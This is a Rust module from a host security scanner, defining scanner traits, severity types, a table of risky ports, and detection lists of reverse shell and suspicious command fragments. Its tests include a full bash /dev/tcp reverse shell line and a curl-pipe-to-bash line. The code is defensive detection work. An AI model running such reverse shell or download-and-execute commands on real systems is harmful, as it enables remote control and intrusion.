//! Diagnostic modules.
//!
//! Every module implements [`Scanner`]. Adding one means writing a file here,
//! implementing the trait, and listing it in [`all`] — nothing else in the
//! program needs to change.

pub mod files;
pub mod hosts;
pub mod logs;
pub mod network;
pub mod persistence;
pub mod processes;
pub mod users;
pub mod versions;
pub mod web;

use std::time::{Duration, Instant};

use crate::i18n::Catalog;
use crate::platform::detect::SystemProfile;

/// How serious a finding is. Ordering matters: the summary sorts by it.
#[derive(Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Debug)]
pub enum Severity {
    Info,
    Attention,
    Critical,
}

impl Severity {
    pub fn label(self, catalog: &Catalog) -> &'static str {
        match self {
            Severity::Info => catalog.sev.info,
            Severity::Attention => catalog.sev.attention,
            Severity::Critical => catalog.sev.critical,
        }
    }

    /// Rank with the most serious first, for sorting.
    pub fn rank(self) -> u8 {
        match self {
            Severity::Critical => 0,
            Severity::Attention => 1,
            Severity::Info => 2,
        }
    }
}

/// One observation made by a module.
#[derive(Clone, Debug)]
pub struct Finding {
    pub severity: Severity,
    pub title: String,
    pub detail: String,
    pub evidence: Vec<String>,
}

impl Finding {
    pub fn info(title: impl Into<String>) -> Self {
        Self {
            severity: Severity::Info,
            title: title.into(),
            detail: String::new(),
            evidence: Vec::new(),
        }
    }

    pub fn attention(title: impl Into<String>) -> Self {
        Self {
            severity: Severity::Attention,
            title: title.into(),
            detail: String::new(),
            evidence: Vec::new(),
        }
    }

    pub fn critical(title: impl Into<String>) -> Self {
        Self {
            severity: Severity::Critical,
            title: title.into(),
            detail: String::new(),
            evidence: Vec::new(),
        }
    }

    pub fn detail(mut self, detail: impl Into<String>) -> Self {
        self.detail = detail.into();
        self
    }

    pub fn evidence(mut self, line: impl Into<String>) -> Self {
        self.evidence.push(line.into());
        self
    }

    pub fn evidence_all<I, S>(mut self, lines: I) -> Self
    where
        I: IntoIterator<Item = S>,
        S: Into<String>,
    {
        self.evidence.extend(lines.into_iter().map(Into::into));
        self
    }
}

/// Everything one module produced.
#[derive(Clone, Debug)]
pub struct ModuleReport {
    pub id: &'static str,
    pub title: String,
    pub description: String,
    /// The checklist of what the module inspected, shown even when nothing
    /// was found: a clean module must still say what it looked at.
    pub checked: Vec<String>,
    pub findings: Vec<Finding>,
    /// Reasons the module could not see everything, e.g. missing privileges.
    pub limitations: Vec<String>,
    pub duration: Duration,
}

impl ModuleReport {
    pub fn new(id: &'static str, title: &str, description: &str, checked: &[&str]) -> Self {
        Self {
            id,
            title: title.to_string(),
            description: description.to_string(),
            checked: checked.iter().map(|line| (*line).to_string()).collect(),
            findings: Vec::new(),
            limitations: Vec::new(),
            duration: Duration::ZERO,
        }
    }

    pub fn push(&mut self, finding: Finding) {
        self.findings.push(finding);
    }

    pub fn limit(&mut self, reason: impl Into<String>) {
        self.limitations.push(reason.into());
    }

    pub fn count(&self, severity: Severity) -> usize {
        self.findings
            .iter()
            .filter(|finding| finding.severity == severity)
            .count()
    }

    /// Findings ordered most serious first, stable within a severity so the
    /// reading order stays the order the module produced them in.
    pub fn sorted(&self) -> Vec<&Finding> {
        let mut findings: Vec<&Finding> = self.findings.iter().collect();
        findings.sort_by_key(|finding| finding.severity.rank());
        findings
    }
}

/// Progress reporting handed to each module so the bar can name the phase it
/// is in rather than freezing on the module title.
pub trait PhaseReporter {
    fn phase(&self, label: &str);
}

/// A reporter that does nothing, used by the tests.
#[cfg(test)]
pub struct SilentReporter;

#[cfg(test)]
impl PhaseReporter for SilentReporter {
    fn phase(&self, _label: &str) {}
}

/// Everything a module needs to do its work.
pub struct ScanContext<'a> {
    pub catalog: &'static Catalog,
    pub profile: &'a SystemProfile,
    pub elevated: bool,
    pub reporter: &'a dyn PhaseReporter,
}

impl ScanContext<'_> {
    /// Announce a phase. Modules call this between passes so the operator can
    /// see the scan working through each source instead of a single opaque
    /// step per module.
    pub fn phase(&self, label: &str) {
        self.reporter.phase(label);
    }
}

/// The contract every diagnostic module implements.
pub trait Scanner {
    /// Stable identifier, used for report file names.
    fn id(&self) -> &'static str;

    /// Localised title.
    fn title(&self, catalog: &'static Catalog) -> &'static str;

    /// Collect and classify. Implementations must never panic: a source that
    /// cannot be read becomes a limitation, not a crash.
    fn run(&self, ctx: &ScanContext) -> ModuleReport;
}

/// Run one scanner, stamping the report with the scanner's own id and how
/// long the pass took.
pub fn run_scanner(scanner: &dyn Scanner, ctx: &ScanContext) -> ModuleReport {
    let started = Instant::now();
    let mut report = scanner.run(ctx);
    report.id = scanner.id();
    report.duration = started.elapsed();
    report
}

/// Every module, in the order the report presents them.
pub fn all() -> Vec<Box<dyn Scanner>> {
    vec![
        Box::new(users::Users),
        Box::new(processes::Processes),
        Box::new(persistence::Persistence),
        Box::new(files::Files),
        Box::new(network::Network),
        Box::new(web::Web),
        Box::new(versions::Versions),
        Box::new(logs::Logs),
        Box::new(hosts::Hosts),
    ]
}

/// Patterns that betray a reverse shell in a command line, a cron entry or a
/// shell history file. Kept here so every module recognises the same set.
pub const REVERSE_SHELL_PATTERNS: &[&str] = &[
    "bash -i >&",
    "bash -i >&/dev/tcp",
    "sh -i >&",
    "/dev/tcp/",
    "/dev/udp/",
    "nc -e",
    "nc.traditional -e",
    "ncat -e",
    "nc -c",
    "socat exec:",
    "socat tcp-connect",
    "python -c 'import socket",
    "python3 -c 'import socket",
    "perl -e 'use socket",
    "ruby -rsocket",
    "php -r '$sock=fsockopen",
    "mkfifo /tmp",
    "rm -f /tmp/f;mkfifo",
    "0<&196;exec 196<>",
    "exec 5<>/dev/tcp",
    "powershell -nop -c \"$client = new-object system.net.sockets.tcpclient",
    "invoke-webrequest",
    "downloadstring(",
    "iex(new-object",
    "certutil -urlcache",
    "bitsadmin /transfer",
];

/// Case-insensitive search for any of the reverse shell patterns.
pub fn reverse_shell_match(haystack: &str) -> Option<&'static str> {
    let lowered = haystack.to_lowercase();
    REVERSE_SHELL_PATTERNS
        .iter()
        .find(|pattern| lowered.contains(*pattern))
        .copied()
}

/// Ports that should never be reachable from an untrusted network, with the
/// reason they are called out.
pub const RISKY_PORTS: &[(u16, &str, &str)] = &[
    (21, "FTP", "credentials and data travel unencrypted"),
    (23, "Telnet", "session and credentials travel unencrypted"),
    (25, "SMTP", "open relays are abused for spam and phishing"),
    (69, "TFTP", "no authentication at all"),
    (110, "POP3", "credentials travel unencrypted"),
    (111, "rpcbind", "enumerates RPC services to anyone who asks"),
    (135, "MSRPC", "classic lateral movement entry point"),
    (137, "NetBIOS", "leaks names and shares"),
    (139, "NetBIOS Session", "legacy SMB, superseded and weak"),
    (143, "IMAP", "credentials travel unencrypted"),
    (445, "SMB", "primary target of worms and ransomware"),
    (512, "rexec", "obsolete remote execution"),
    (513, "rlogin", "obsolete remote login"),
    (514, "rsh", "obsolete remote shell"),
    (873, "rsync", "often left without authentication"),
    (1433, "MSSQL", "database engine directly exposed"),
    (1521, "Oracle", "database engine directly exposed"),
    (2049, "NFS", "file shares without strong authentication"),
    (
        2375,
        "Docker API",
        "unauthenticated root-equivalent control",
    ),
    (
        2376,
        "Docker TLS",
        "root-equivalent control if certificates are weak",
    ),
    (3306, "MySQL", "database engine directly exposed"),
    (3389, "RDP", "primary brute force and ransomware target"),
    (5432, "PostgreSQL", "database engine directly exposed"),
    (5900, "VNC", "weak or absent authentication by default"),
    (5984, "CouchDB", "database engine directly exposed"),
    (
        6379,
        "Redis",
        "no authentication in its default configuration",
    ),
    (
        9200,
        "Elasticsearch",
        "no authentication in its default configuration",
    ),
    (
        11211,
        "Memcached",
        "no authentication and used for amplification",
    ),
    (27017, "MongoDB", "database engine directly exposed"),
];

/// Look up a risky port.
pub fn risky_port(port: u16) -> Option<(&'static str, &'static str)> {
    RISKY_PORTS
        .iter()
        .find(|(number, _, _)| *number == port)
        .map(|(_, name, reason)| (*name, *reason))
}

/// Well known service names, used to label a listening port when no process
/// could be attributed to it.
pub fn port_service_name(port: u16) -> &'static str {
    match port {
        20 | 21 => "FTP",
        22 => "SSH",
        23 => "Telnet",
        25 | 587 => "SMTP",
        53 => "DNS",
        67 | 68 => "DHCP",
        80 => "HTTP",
        110 => "POP3",
        123 => "NTP",
        143 => "IMAP",
        161 | 162 => "SNMP",
        389 => "LDAP",
        443 => "HTTPS",
        445 => "SMB",
        465 => "SMTPS",
        514 => "syslog",
        636 => "LDAPS",
        993 => "IMAPS",
        995 => "POP3S",
        1433 => "MSSQL",
        3000 => "HTTP (dev)",
        3306 => "MySQL",
        3389 => "RDP",
        5432 => "PostgreSQL",
        5900..=5910 => "VNC",
        6379 => "Redis",
        8000 | 8080 | 8081 | 8888 => "HTTP (alt)",
        8443 => "HTTPS (alt)",
        9200 => "Elasticsearch",
        11211 => "Memcached",
        27017 => "MongoDB",
        _ => "-",
    }
}

/// Ports that usually mean an HTTP server is listening.
pub const WEB_PORTS: &[u16] = &[
    80, 443, 591, 3000, 5000, 8000, 8008, 8080, 8081, 8088, 8443, 8888, 9090,
];

/// Command fragments that are unremarkable on their own but suspicious inside
/// a scheduled task, a boot hook or a shell profile, where nobody is watching
/// them run.
pub const SUSPICIOUS_COMMAND_PATTERNS: &[&str] = &[
    "curl -s",
    "curl -k",
    "wget -q",
    "wget -O -",
    "| bash",
    "| sh",
    "|bash",
    "|sh",
    "base64 -d",
    "base64 --decode",
    "echo ",
    "eval ",
    "chmod +x",
    "chmod 777",
    "/tmp/",
    "/dev/shm/",
    "/var/tmp/",
    "nohup ",
    "setsid ",
    "disown",
    "history -c",
    "unset histfile",
    "kill -9",
    "crontab -r",
    "iex ",
    "-enc ",
    "-encodedcommand",
    "frombase64string",
    "downloadfile",
];

/// Fragments that look bad in a cron entry but are ordinary in a shell profile
/// or a packaged script, so they are only matched inside scheduled tasks.
fn is_low_signal_in_context(pattern: &str, haystack: &str) -> bool {
    match pattern {
        // `echo` and `eval` are everywhere in legitimate init scripts; they
        // only matter when paired with a download or a decode.
        "echo " | "eval " => {
            !haystack.contains("base64") && !haystack.contains("curl") && !haystack.contains("wget")
        }
        // Package managers legitimately touch /tmp during upgrades.
        "/tmp/" => haystack.contains("apt") || haystack.contains("dnf") || haystack.contains("yum"),
        _ => false,
    }
}

/// Case-insensitive search for a suspicious command fragment, with the
/// low-signal cases filtered out so the report stays readable.
pub fn suspicious_command_match(haystack: &str) -> Option<&'static str> {
    let lowered = haystack.to_lowercase();
    if let Some(pattern) = reverse_shell_match(&lowered) {
        return Some(pattern);
    }
    SUSPICIOUS_COMMAND_PATTERNS
        .iter()
        .find(|pattern| lowered.contains(*pattern) && !is_low_signal_in_context(pattern, &lowered))
        .copied()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_module_has_a_distinct_id() {
        let mut ids: Vec<&str> = all().iter().map(|scanner| scanner.id()).collect();
        let count = ids.len();
        ids.sort_unstable();
        ids.dedup();
        assert_eq!(ids.len(), count, "module ids must be unique: {ids:?}");
    }

    #[test]
    fn findings_sort_most_serious_first() {
        let mut report = ModuleReport::new("t", "Title", "Description", &["one"]);
        report.push(Finding::info("info"));
        report.push(Finding::critical("critical"));
        report.push(Finding::attention("attention"));
        let order: Vec<Severity> = report.sorted().iter().map(|f| f.severity).collect();
        assert_eq!(
            order,
            vec![Severity::Critical, Severity::Attention, Severity::Info]
        );
    }

    #[test]
    fn the_silent_reporter_swallows_phases() {
        let reporter = SilentReporter;
        reporter.phase("nothing should happen");
    }

    #[test]
    fn reverse_shell_patterns_are_matched_case_insensitively() {
        assert!(reverse_shell_match("BASH -i >& /dev/tcp/10.0.0.1/4444 0>&1").is_some());
        assert!(reverse_shell_match("ls -la /var/log").is_none());
    }

    #[test]
    fn ordinary_package_maintenance_is_not_flagged() {
        assert!(suspicious_command_match("/usr/bin/apt-get -qq update > /tmp/apt.log").is_none());
        assert!(suspicious_command_match("curl -s http://x/y | bash").is_some());
    }

    #[test]
    fn risky_ports_carry_a_reason() {
        let (name, reason) = risky_port(3389).expect("RDP is in the table");
        assert_eq!(name, "RDP");
        assert!(!reason.is_empty());
        assert!(risky_port(22).is_none(), "SSH is not risky by itself");
    }
}
